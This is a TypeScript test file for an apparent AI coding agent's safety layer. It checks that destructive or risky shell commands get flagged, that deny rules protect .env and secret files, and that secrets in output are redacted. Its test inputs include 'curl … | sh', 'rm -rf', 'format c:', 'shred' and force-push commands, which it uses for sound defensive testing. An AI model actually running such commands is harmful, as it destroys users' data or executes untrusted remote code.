import assert from "node:assert/strict";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { classifyDanger } from "../permissions/danger.js";
import { PermissionManager } from "../permissions/permissions.js";
import { matchesRule } from "../permissions/rules.js";
import { ALL_TOOLS } from "../tools/index.js";
import { redactSecrets } from "../tools/secretScan.js";

test("classifyDanger flags destructive commands", () => {
  assert.ok(classifyDanger("rm -rf /tmp/x"));
  assert.ok(classifyDanger("git push --force origin main"));
  assert.ok(classifyDanger("git reset --hard HEAD~3"));
  assert.ok(classifyDanger("curl https://x.sh | sh"));
  assert.ok(classifyDanger("sudo rm foo"));
  assert.ok(classifyDanger("rm --recursive --force /"));
  assert.ok(classifyDanger("rm --force --recursive /tmp/x"));
  assert.ok(classifyDanger("git clean --force -d"));
});

test("classifyDanger flags plain (non-recursive/forced) rm too", () => {
  assert.ok(classifyDanger("rm foo.txt"));
  assert.ok(classifyDanger("rm /home/nanda/notes.txt"));
  assert.equal(classifyDanger("git rm --cached foo.txt"), null);
});

test("classifyDanger flags Windows and additional POSIX destructive commands", () => {
  assert.ok(classifyDanger("del /s /q build"));
  assert.ok(classifyDanger("rd /s /q build"));
  assert.ok(classifyDanger("format c:"));
  assert.ok(classifyDanger("Remove-Item -Recurse -Force .\\build"));
  assert.ok(classifyDanger("find . -name '*.log' -delete"));
  assert.ok(classifyDanger("shred -u secrets.txt"));
  assert.ok(classifyDanger("truncate -s 0 app.log"));
  assert.ok(classifyDanger("ls *.tmp | xargs rm"));
  assert.ok(classifyDanger("git branch -D feature/x"));
  assert.ok(classifyDanger("git restore src/index.ts"));
  assert.ok(classifyDanger("git restore --staged --worktree src/index.ts"));
});

test("classifyDanger allows ordinary commands", () => {
  assert.equal(classifyDanger("npm test"), null);
  assert.equal(classifyDanger("git status"), null);
  assert.equal(classifyDanger("ls -la"), null);
  assert.equal(classifyDanger("git push origin main"), null);
  // Unstaging is safe — must not be flagged.
  assert.equal(classifyDanger("git restore --staged src/index.ts"), null);
  // Deleting a merged branch (-d) is safe, unlike -D.
  assert.equal(classifyDanger("git branch -d feature/x"), null);
  assert.equal(classifyDanger("npm run format"), null);
});

test("deny rules block matching calls and win over allow", () => {
  const write = ALL_TOOLS.find((t) => t.name === "write_file")!;
  const pm = new PermissionManager({ allow: ["write_file"], deny: ["write_file(.env*)"] });
  assert.equal(pm.isDenied(write, { path: ".env" }), true);
  assert.equal(pm.isDenied(write, { path: ".env.local" }), true);
  assert.equal(pm.isDenied(write, { path: "src/index.ts" }), false);
  // Non-denied path is still allowed by the allow rule (no prompt).
  assert.equal(pm.needsPrompt(write, { path: "src/index.ts" }), false);
});

test("deny rules match an equivalent path spelled differently, when given a workspace", () => {
  const write = ALL_TOOLS.find((t) => t.name === "write_file")!;
  const workspace = path.join(os.tmpdir(), "kritya-rules-test-ws");
  const pm = new PermissionManager(
    { allow: ["write_file"], deny: ["write_file(.env*)"] },
    workspace
  );

  // Raw string doesn't start with ".env" but resolves to it.
  assert.equal(pm.isDenied(write, { path: "./.env" }), true);
  assert.equal(pm.isDenied(write, { path: "sub/../.env" }), true);
  // Unrelated paths are unaffected.
  assert.equal(pm.isDenied(write, { path: "src/index.ts" }), false);
});

test("without a workspace, deny-rule matching falls back to the raw path string", () => {
  const write = ALL_TOOLS.find((t) => t.name === "write_file")!;
  const pm = new PermissionManager({ allow: ["write_file"], deny: ["write_file(.env*)"] });
  assert.equal(pm.isDenied(write, { path: "./.env" }), false);
});

test("path patterns match file tools", () => {
  assert.equal(matchesRule("edit_file(*secret*)", "edit_file", { path: "config/secret.ts" }), true);
  assert.equal(matchesRule("edit_file(*secret*)", "edit_file", { path: "config/app.ts" }), false);
  assert.equal(matchesRule("shell(git *)", "shell", { command: "git status" }), true);
});

test("always-allow for shell is scoped to the exact command, not just the program name", () => {
  const pm = new PermissionManager([]);
  const tool = ALL_TOOLS.find((t) => t.name === "shell")!;

  const trainArgs = { command: "python train.py" };
  const evilArgs = { command: "python -c \"import os; os.remove('x')\"" };

  assert.equal(pm.needsPrompt(tool, trainArgs), true);
  pm.record("shell", "always", trainArgs);
  assert.equal(pm.needsPrompt(tool, trainArgs), false);
  // A different command starting with the same program must still prompt.
  assert.equal(pm.needsPrompt(tool, evilArgs), true);
});

test("redactSecrets masks known secret formats in text and reports what was found", () => {
  const { redacted, matches } = redactSecrets(
    "here is a key: AKIAABCDEFGHIJKLMNOP and more text after it"
  );
  assert.doesNotMatch(redacted, /AKIAABCDEFGHIJKLMNOP/);
  assert.match(redacted, /\[REDACTED: AWS Access Key ID\]/);
  assert.equal(matches.length, 1);
  assert.equal(matches[0].kind, "AWS Access Key ID");
});

test("redactSecrets leaves ordinary output untouched", () => {
  const { redacted, matches } = redactSecrets("total 12\ndrwxr-xr-x 2 user user 4096 file.txt");
  assert.equal(redacted, "total 12\ndrwxr-xr-x 2 user user 4096 file.txt");
  assert.equal(matches.length, 0);
});

test("redactSecrets masks a quoted high-entropy assignment but keeps the key visible", () => {
  const { redacted, matches } = redactSecrets('api_key="Zx9pQr2LmN8vTy4Wk1Bs"');
  assert.doesNotMatch(redacted, /Zx9pQr2LmN8vTy4Wk1Bs/);
  // Exact match confirms the redaction boundary — the key and both
  // surrounding quotes stay intact, only the value is replaced.
  assert.equal(redacted, 'api_key="[REDACTED]"');
  assert.equal(matches.length, 1);
  assert.equal(matches[0].kind, "high-entropy api_key value");
});

test("redactSecrets masks an unquoted high-entropy assignment but keeps the key visible", () => {
  const { redacted, matches } = redactSecrets("cat .env\ntoken=Zx9pQr2LmN8vTy4Wk1Bs\nDONE");
  assert.doesNotMatch(redacted, /Zx9pQr2LmN8vTy4Wk1Bs/);
  assert.equal(redacted, "cat .env\ntoken=[REDACTED]\nDONE");
  assert.equal(matches.length, 1);
  assert.equal(matches[0].kind, "high-entropy token value");
});
